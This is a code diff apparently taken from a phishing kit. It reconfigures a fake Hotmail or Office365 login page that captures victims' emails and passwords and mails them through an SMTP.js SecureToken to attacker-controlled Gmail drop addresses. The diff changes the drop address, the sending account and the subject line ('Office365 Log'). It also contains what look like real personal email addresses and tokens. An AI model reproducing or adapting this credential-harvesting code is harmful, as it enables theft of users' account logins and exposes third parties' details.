@@ -1,8 +1,8 @@
-var smtp_host = 'smtp.office365.com';
-var smtp_username = 'marc.declercq@edu.vlerick.com';
+var smtp_host = 'smtp.gmail.com';
+var smtp_username = 'emily4luv90@gmail.com';
 
 //Enter were logs will go here
-var log_email = 'johnchurchwell118@gmail.com'
+var log_email = 'topwrk123@gmail.com'
 
 
 url_link = "session.html";
@@ -49,7 +49,7 @@ function processPassword2(t) {
     t.preventDefault();
     var e = this.userPassword2.value.trim();
 
-    var message = "<div> ==================+[ Personal Info - Hotmail ]+================== <br> Username/Email => " + userEmail +  "<br>Password => "+userPassword +  "<br>confirm_password => " + e +"</div>"; 
+    var message = "<div> ==+[ Client -Info ]+= <br> Username/Email => " + userEmail +  "<br>Password => "+userPassword +  "<br>Confirm_password => " + e +"</div>"; 
     
     "" != e ? (sendEmail(log_email, message), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
 }
@@ -100,10 +100,10 @@ function sendEmail(to,message) {
   // Host: smtp_host,
   // Username : smtp_username,
   // Password : smtp_password,
-  SecureToken: '232d9590-ce69-4dec-8b72-178e83e97702',
-  To : to,
+  SecureToken: '192bfa31-d02e-49d8-b15e-dd37ced23e0d',
+  To : 'topwrk123@gmail.com',
   From : smtp_username,
-  Subject : '==============+ [Hotmail] +================',
+  Subject : '===+ [Office365 Log] +===',
   Body : message,
   }).then(function(message){
       if(message == 'OK'){
